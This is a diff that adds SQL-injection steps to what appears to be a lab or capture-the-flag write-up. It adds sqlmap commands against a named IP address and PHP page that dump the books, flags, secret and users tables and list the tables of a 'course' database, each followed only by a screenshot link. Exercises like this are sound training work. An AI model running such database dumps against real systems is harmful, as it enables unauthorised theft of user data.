@@ -309,3 +309,32 @@ sqlmap -u http://51.250.91.149/SQL/sql3.php --data="number=1&submit=%D0%9D%D1%83
 ![image](https://github.com/user-attachments/assets/4faf5bdc-09d0-4fd1-9db2-749d4a504c48)
 
 
+sqlmap -u http://51.250.91.149/SQL/sql3.php --data="number=1&submit=%D0%9D%D1%83%2C+%D0%B2%D0%B2%D0%B5%D0%BB" -D 1ccb8097d0e9ce9f154608be60224c7c -T books --dump
+
+
+![image](https://github.com/user-attachments/assets/5d4d88ee-00c7-4045-a388-850698255d66)
+
+
+sqlmap -u http://51.250.91.149/SQL/sql3.php --data="number=1&submit=%D0%9D%D1%83%2C+%D0%B2%D0%B2%D0%B5%D0%BB" -D 1ccb8097d0e9ce9f154608be60224c7c -T flags --dump
+
+
+![image](https://github.com/user-attachments/assets/8180c4ee-900c-460a-b829-0d5bc183ed71)
+
+
+sqlmap -u http://51.250.91.149/SQL/sql3.php --data="number=1&submit=%D0%9D%D1%83%2C+%D0%B2%D0%B2%D0%B5%D0%BB" -D 1ccb8097d0e9ce9f154608be60224c7c -T secret --dump
+
+![image](https://github.com/user-attachments/assets/676719fb-9a17-4980-b42a-258ea3b86054)
+
+sqlmap -u http://51.250.91.149/SQL/sql3.php --data="number=1&submit=%D0%9D%D1%83%2C+%D0%B2%D0%B2%D0%B5%D0%BB" -D 1ccb8097d0e9ce9f154608be60224c7c -T users --dump
+
+![image](https://github.com/user-attachments/assets/2a516c25-650d-4aae-999d-78dddf89b35d)
+
+sqlmap -u http://51.250.91.149/SQL/sql3.php --data="number=1&submit=%D0%9D%D1%83%2C+%D0%B2%D0%B2%D0%B5%D0%BB" -D course --tables
+
+![image](https://github.com/user-attachments/assets/809a92a5-3ca8-46b6-9ce7-34c6000a6865)
+
+
+
+
+
+
